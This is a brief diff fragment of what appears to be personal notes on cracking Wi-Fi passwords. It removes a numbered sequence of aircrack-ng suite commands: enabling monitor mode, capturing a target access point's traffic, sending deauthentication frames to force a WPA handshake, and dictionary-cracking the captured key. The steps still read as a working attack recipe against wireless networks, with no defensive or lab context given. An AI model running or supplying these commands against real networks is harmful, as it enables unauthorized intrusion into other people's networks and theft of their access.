@@ -23,9 +23,4 @@
 aircrack-ng -0 FileName2.cap
 
 
-3.1 #iwconfig
-3.2 #airmon-ng start wlan0
-3.3 #airodump-ng mon0
-3.4 #airodump-ng -c 3 --bssid <bssid> -w <FileName3>
-aireplay-ng -0 1 -a <bssid> -c <host_mac> mon0
-aircrack-ng -0 -w psk-crack-dictionary FileName3.cap
+
